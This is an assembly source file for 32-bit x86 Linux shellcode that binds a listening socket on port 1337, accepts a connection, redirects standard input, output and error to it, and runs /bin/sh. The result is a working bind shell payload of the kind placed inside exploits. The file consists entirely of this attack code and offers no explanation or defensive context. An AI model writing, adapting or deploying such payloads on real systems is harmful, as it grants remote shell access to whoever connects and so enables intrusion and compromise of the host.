section .text

global _start

_start:

; SYS_SOCKET 1
   xor eax, eax
   xor ebx, ebx
   push eax
   mov bl, 1
   push ebx
   push 2
   mov ecx, esp
   mov al, 102
   int 0x80
; eax now contains socket
   mov edi, eax

; SYS_BIND   2
; create struct sockaddr on stack
   xor esi, esi
   push esi
   push word 0x3905
   push word 2
   mov ecx, esp  ; ptr to sockaddr
   push 16
   push ecx
   push edi
   mov ecx, esp  ; ptr to args
   mov bl, 2
   mov al, 102
   int 0x80

; SYS_LISTEN 4
   push 1
   push edi        ; socket
   mov ecx, esp
   mov bl, 4
   mov al, 102
   int 0x80

; SYS_ACCEPT 5
   xor eax, eax
   push eax
   push eax
   push edi        ; socket from accept
   mov ecx, esp
   mov bl, 5
   mov al, 102
   int 0x80
   mov edi, eax    ; replace our socket with accepted socket
  
;dup2 shell code for stdin (0), stdout (1), stderr (2)
   mov ebx, edi    ; socket from accept
   xor ecx, ecx

duploop:
   mov al, 63      ;dup 2 syscall refresh from last dup syscall
   int 0x80
   inc ecx
   cmp ecx, 3   
   jne duploop

;execve shell code
   xor eax, eax
   push eax
   push 0x68732f2f
   push 0x6e69622f
   mov ebx, esp     ; get ptr to /bin//sh
   push eax         ; 
   push ebx         ; 
   xor edx, edx     ; clean up registers used earlier
   xor esi, esi     ; clean registers
   mov ecx, esp     ; if both removed, then need to xor this
   mov al, 0xb
   int 0x80 

